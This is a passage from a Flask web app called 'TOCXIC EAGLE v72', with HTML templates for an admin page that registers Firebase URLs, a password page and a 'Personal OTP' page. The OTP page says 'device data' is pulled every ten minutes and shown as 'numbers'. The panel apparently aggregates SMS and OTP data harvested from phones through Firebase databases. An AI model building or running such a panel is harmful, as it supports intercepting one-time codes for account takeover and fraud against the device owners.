.fb-icon{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,#fef3c7,#fde68a);
  display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.fb-info{flex:1;min-width:0}
.fb-name{font-size:14px;font-weight:800;color:var(--text);font-family:'Orbitron',sans-serif}
.fb-hash{font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace;word-break:break-all}
.fb-actions button{padding:10px 14px;font-size:12px;background:rgba(228,0,0,.1);
  color:var(--red2);border:none;border-radius:10px;font-weight:800;cursor:pointer}
.msg{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;display:none;font-weight:700}
.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
</style></head><body>
<div class="topbar">
<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
</div>
<div class="nav-links">
<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
<a href="/firebases" class="nav-link active">🔥 Firebases</a>
<a href="/admin/security" class="nav-link">🔒 Security</a>
<a href="/logout" class="nav-link">Logout</a>
</div>
<div class="container">
<div class="card">
<h3>➕ Add Firebase URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx.firebaseio.com"
  onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button onclick="addFirebase()">Add</button>
<button class="green" onclick="bulkAdd()">Bulk Add</button>
</div>
<div id="fb-msg" class="msg"></div>
</div>
<div class="card">
<h3>🔥 Registered Firebases <span id="fb-count" style="color:var(--text3);font-weight:600">(0)</span></h3>
<div id="fb-list" class="fb-list"></div>
</div>
</div>
<div id="toast"></div>
<script>
function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
function showMsg(t, type){ const e = document.getElementById('fb-msg');
e.className = 'msg ' + type; e.textContent = t;
if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
async function addFirebase(){
  const url = document.getElementById('fb-url').value.trim();
  if(!url) return showMsg('URL required','err');
  try {
    const r = await fetch('/api/firebases', { method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
    const d = await r.json();
    if(d.success){ showMsg('✅ Added','ok'); document.getElementById('fb-url').value=''; loadFbs(); }
    else showMsg('❌ ' + (d.error||'Error'),'err');
  } catch(e){ showMsg('❌ Network error','err'); }
}
async function bulkAdd(){
  const txt = prompt('Paste URLs (one per line):');
  if(!txt) return;
  const urls = txt.split('\\n').map(x => x.trim()).filter(Boolean);
  if(!urls.length) return showMsg('No URLs','err');
  showMsg('⏳ Adding ' + urls.length + '...','ok');
  const r = await fetch('/api/firebases/bulk', { method:'POST',
    headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls}) });
  const d = await r.json();
  if(d.success){ showMsg('✅ Added: ' + d.added + ' · Skip: ' + d.skipped,'ok'); loadFbs(); }
  else showMsg('❌ ' + (d.error||'Error'),'err');
}
async function loadFbs(){
  try {
    const r = await fetch('/api/firebases'); const d = await r.json();
    const box = document.getElementById('fb-list');
    document.getElementById('fb-count').textContent = '(' + (d.firebases?.length || 0) + ')';
    if(!d.firebases || !d.firebases.length){
      box.innerHTML = '<div class="empty">🦅 No firebase yet</div>'; return;
    }
    box.innerHTML = d.firebases.map(f => `
      <div class="fb-card">
        <div class="fb-icon">🔥</div>
        <div class="fb-info">
          <div class="fb-name">${escHtml(f.name||'unnamed')}</div>
          <div class="fb-hash">🔒 ID: ${escHtml(f.hash||'hidden')}</div>
        </div>
        <div class="fb-actions">
          <button onclick="removeFb('${f.id}')">🗑 Delete</button>
        </div>
      </div>`).join('');
  } catch(e){}
}
async function removeFb(id){
  if(!confirm('Delete this firebase?')) return;
  const r = await fetch('/api/firebases/' + id, { method:'DELETE' });
  const d = await r.json();
  if(d.success){ toast('✅ Deleted'); loadFbs(); }
  else toast('❌ ' + (d.error||'Error'));
}
function escHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
loadFbs();
</script>
</body></html>"""

@app.route("/firebases")
@admin_required
def firebases_page():
    return Response(FIREBASES_HTML, mimetype="text/html")

SECURITY_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Security</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + DARK_CSS + """
.container{max-width:520px;margin:0 auto;padding:20px}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:14px}
.card h3{font-size:14px;color:var(--text);margin-bottom:6px;font-weight:800;
  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
.card p.desc{font-size:12px;color:var(--text3);margin-bottom:16px}
.field label{display:block;font-size:12px;color:var(--text3);font-weight:700;margin-bottom:6px}
.pwd-wrap{position:relative}
.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:12px;
  border:1.5px solid var(--border2);background:var(--bg3);outline:none;color:var(--text)}
.pwd-wrap input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(59,130,246,.12)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
  cursor:pointer;font-size:18px;color:var(--text3);padding:4px}
.btn{padding:14px 20px;border:none;border-radius:12px;font-weight:800;font-size:13px;
  width:100%;min-height:50px;font-family:inherit;cursor:pointer;background:var(--grad-r);color:#fff;margin-top:14px}
.msg{margin-top:12px;padding:12px 14px;border-radius:12px;font-size:13px;
  display:none;text-align:center;font-weight:700}
.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
</style></head><body>
<div class="topbar">
<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
</div>
<div class="nav-links">
<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
<a href="/firebases" class="nav-link">🔥 Firebases</a>
<a href="/admin/security" class="nav-link active">🔒 Security</a>
<a href="/logout" class="nav-link">Logout</a>
</div>
<div class="container">
<div class="card">
<h3>👑 Change Admin Password</h3>
<p class="desc">New password saves to MongoDB permanently.</p>
<div class="field">
<label>New Admin Password</label>
<div class="pwd-wrap">
<input type="password" id="admin-pwd" placeholder="Enter new password">
<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
</div>
</div>
<button class="btn" onclick="changePwd()">Update Password</button>
<div class="msg" id="admin-msg"></div>
</div>
</div>
<div id="toast"></div>
<script>
function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
function togglePwd(e){ const i = document.getElementById('admin-pwd'); const t = e.target;
  if(i.type === 'password'){ i.type='text'; t.textContent='🙈'; }
  else { i.type='password'; t.textContent='👁️'; } }
function showMsg(t, type){ const e = document.getElementById('admin-msg');
  e.className = 'msg ' + type; e.textContent = t;
  if(type==='ok') setTimeout(()=>{ e.className='msg'; }, 3000); }
async function changePwd(){
  const pwd = document.getElementById('admin-pwd').value.trim();
  if(!pwd || pwd.length < 4){ showMsg('❌ Min 4 chars','err'); return; }
  const r = await fetch('/api/security/change', { method:'POST',
    headers:{'Content-Type':'application/json'}, body: JSON.stringify({role:'admin', password: pwd}) });
  const d = await r.json();
  if(d.success){ showMsg('✅ Saved!','ok'); document.getElementById('admin-pwd').value=''; toast('✅ Changed'); }
  else showMsg('❌ ' + (d.error||'Error'),'err');
}
</script>
</body></html>"""

@app.route("/admin/security")
@admin_required
def admin_security():
    return Response(SECURITY_HTML, mimetype="text/html")

PERSONAL_OTP_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
""" + ORBITRON + """
<style>""" + DARK_CSS + """
.container{max-width:800px;margin:0 auto;padding:16px}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:14px}
.card h3{font-size:13px;color:var(--text);margin-bottom:14px;font-weight:800;
  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
.add-row{display:flex;gap:8px;flex-wrap:wrap}
.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
  border:1px solid var(--border2);background:var(--bg3);font-size:14px;outline:none;color:var(--text)}
.add-row input:focus{border-color:#12b76a;box-shadow:0 0 0 4px rgba(18,183,106,.12)}
.add-row button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;font-size:12px;
  font-family:inherit;min-height:50px;cursor:pointer;background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
.msg{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;display:none;font-weight:700}
.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
</style></head><body>
<div class="topbar">
<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
</div>
<div class="nav-links">
<a href="/user" class="nav-link">📱 Numbers</a>
<a href="/otp" class="nav-link green active">🔐 Personal OTP</a>
<a href="/" class="nav-link">🏠 Home</a>
</div>
<div class="container">
<div class="card">
<h3>🔐 Add Your Own Firebase</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com"
  onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button onclick="addFirebase()">Add Firebase</button>
</div>
<div id="msg" class="msg"></div>
</div>
<div class="card">
<h3>ℹ️ How it works</h3>
<div style="font-size:13px;color:var(--text2);line-height:1.7">
1. Apna Firebase RTDB URL daalo<br>
2. Admin dashboard me register hoga<br>
3. 10 min me device data fetch hoga<br>
4. /user panel me numbers dikhengi<br>
5. Admin broadcasts Mail tab me aayenge
</div>
</div>
</div>
<div id="toast"></div>
<script>
function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
function showMsg(t, type){ const e = document.getElementById('msg');
e.className = 'msg ' + type; e.textContent = t;
if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 4000); }
async function addFirebase(){
  const url = document.getElementById('fb-url').value.trim();
  if(!url) return showMsg('❌ URL required','err');
  showMsg('⏳ Adding...','ok');
  try {
    const r = await fetch('/api/otp/add', { method:'POST',
      headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
    const d = await r.json();
    if(d.success){
      showMsg('✅ Added! Admin dashboard me 10 min me dikhega','ok');
      document.getElementById('fb-url').value = '';
      toast('✅ Firebase added');
    } else showMsg('❌ ' + (d.error||'Error'),'err');
  } catch(e){ showMsg('❌ Network error','err'); }
}
</script>
</body></html>"""

@app.route("/otp")
def personal_otp():
    return Response(PERSONAL_OTP_HTML, mimetype="text/html")

# ═══════════════════════════════════════════════════════════════
# START
# ═══════════════════════════════════════════════════════════════
if not IS_SERVERLESS:
    threading.Thread(target=bg_refresher, daemon=True).start()
    print(f"[✓] BG refresher started — {BG_REFRESH_INTERVAL}s interval (10 min)")
else:
    print("[i] Serverless mode: BG disabled")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"[✓] Starting TOCXIC EAGLE v72 on 0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
